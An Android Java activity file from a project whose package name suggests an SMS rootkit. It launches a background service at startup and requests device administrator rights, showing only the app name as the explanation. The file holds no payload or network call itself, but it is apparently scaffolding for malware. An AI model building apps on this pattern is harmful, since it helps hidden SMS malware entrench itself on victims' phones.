package com.funny.fortest.smsrookit;

import android.content.Context;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.content.ServiceConnection;
import android.content.ComponentName;
import android.os.IBinder;
import android.content.Intent;
import android.util.Log;
import android.app.admin.DevicePolicyManager;
public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        //启动主服务
        Intent startIntent = new Intent(this, MainService.class);
        startService(startIntent);
        requestDeviceAdmin();
    }

    private void requestDeviceAdmin() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName mPolicyAdmin = new ComponentName(this,
                DeviceMyReceiver.class);
        if (!dpm.isAdminActive(mPolicyAdmin)) {
            Intent activateDeviceAdminIntent = new Intent(
                    DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            activateDeviceAdminIntent.putExtra(
                    DevicePolicyManager.EXTRA_DEVICE_ADMIN, mPolicyAdmin);
            activateDeviceAdminIntent.putExtra(
                    DevicePolicyManager.EXTRA_ADD_EXPLANATION, getResources()
                            .getString(R.string.app_name));
            startActivityForResult(activateDeviceAdminIntent, 1);
            return;
        }
    }
}
